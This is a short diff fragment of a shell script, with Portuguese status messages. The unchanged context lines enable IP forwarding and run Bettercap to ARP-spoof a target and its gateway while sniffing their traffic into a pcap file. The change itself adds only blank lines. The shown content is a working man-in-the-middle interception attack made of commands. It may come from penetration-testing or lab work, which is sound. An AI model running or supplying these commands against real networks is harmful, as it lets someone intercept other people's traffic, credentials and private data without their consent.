@@ -22,3 +22,5 @@ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 echo "Iniciando o Bettercap com ARP spoofing e captura de pacotes em $PCAP_FILE..."
 sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGET,$GATEWAY; set net.sniff.output $PCAP_FILE; arp.spoof on; net.sniff on"
 
+
+
